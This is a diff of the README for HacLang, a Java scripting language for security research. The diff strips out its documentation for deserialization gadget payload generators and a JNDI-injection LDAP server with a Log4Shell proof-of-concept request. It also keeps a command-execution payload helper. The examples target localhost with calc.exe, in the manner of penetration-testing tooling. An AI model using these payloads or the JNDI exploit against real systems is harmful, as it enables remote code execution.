@@ -7,12 +7,10 @@
 
 ![](https://github.com/EmYiQing/HacLang/blob/master/img/logo.png)
 
-这是一个基于`Java`的脚本语言，主要面向渗透测试与安全研究人员，提供了一些简单的内置库
+这是一个基于`Java`的脚本语言，提供了一些简单的内置库
 1. 实现基于状态机的词法分析
 2. 巴科斯范式（BNF）生成抽象语法树
 3. 递归遍历抽象语法树执行代码
-
-为什么取名为`HacLang`：A Language For Hackers
 
 ## 基础
 
@@ -276,7 +274,7 @@ http::doRequest(req);
 
 ### 04 Tool库
 
-用于渗透测试相关：生成命令执行的`Payload`
+生成命令执行的`Payload`
 
 Java中直接执行命令会存在问题，所以需要特殊处理
 
@@ -297,80 +295,6 @@ print(payload);
 
 // 执行命令
 tool::exec(payload);
-```
-
-### 05 Payload库
-
-用于`Java`反序列化漏洞安全研究，生成各种`Gadget`的`Payload`
-
-返回的字符串已对结果进行`Base64`编码
-
-```cpp
-#include "payload"
-#include "tool"
-
-cmd = tool::getPowershellCommand("calc.exe");
-cc1 = payload::getCC1(cmd);
-print(cc1);
-
-cc2 = payload::getCC2(cmd);
-print(cc2);
-
-cc3 = payload::getCC3(cmd);
-print(cc3);
-
-cc4 = payload::getCC4(cmd);
-print(cc4);
-
-cc5 = payload::getCC5(cmd);
-print(cc5);
-
-cc6 = payload::getCC6(cmd);
-print(cc6);
-
-cc7 = payload::getCC7(cmd);
-print(cc7);
-
-cck1 = payload::getCCK1(cmd);
-print(cck1);
-
-cck2 = payload::getCCK2(cmd);
-print(cck2);
-
-cck3 = payload::getCCK3(cmd);
-print(cck3);
-
-cck4 = payload::getCCK4(cmd);
-print(cck4);
-```
-
-### 06 LDAP库
-
-这不是传统意义的`LDAP`服务端，而是针对于`JNDI`注入的服务端
-
-```cpp
-#include "ldap"
-#include "tool"
-#include "http"
-#include "base64"
-
-// LDAP服务端口
-ldapPort = 1389;
-// HTTP CodeBase端口
-httpPort = 8888;
-// 获取命令
-cmd = tool::getPowershellCommand("calc.exe");
-// 启动LDAP服务
-ldap::startServer(ldapPort,httpPort,cmd);
-
-// 针对于Log42Shell漏洞的POC
-headers = newMap();
-putMap(headers,"User-Agent","4ra1n");
-url = "http://127.0.0.1:8080/test?message=";
-payload = "${jndi:ldap://127.0.0.1:1389/cmd}";
-payload = base64::encode(payload);
-url = url + payload;
-response = http::doGet(url,headers);
 ```
 
 ### 07 案例一
